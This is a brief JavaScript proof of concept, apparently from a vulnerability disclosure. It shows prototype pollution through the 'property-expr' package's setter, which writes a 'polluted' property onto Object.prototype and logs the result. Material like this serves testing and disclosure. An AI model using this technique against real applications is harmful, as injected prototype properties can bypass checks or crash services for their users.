var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
let expr = require('property-expr');
obj = {};
console.log({}.polluted);
expr.setter('constructor.prototype.polluted')(obj, 'yes');
console.log({}.polluted);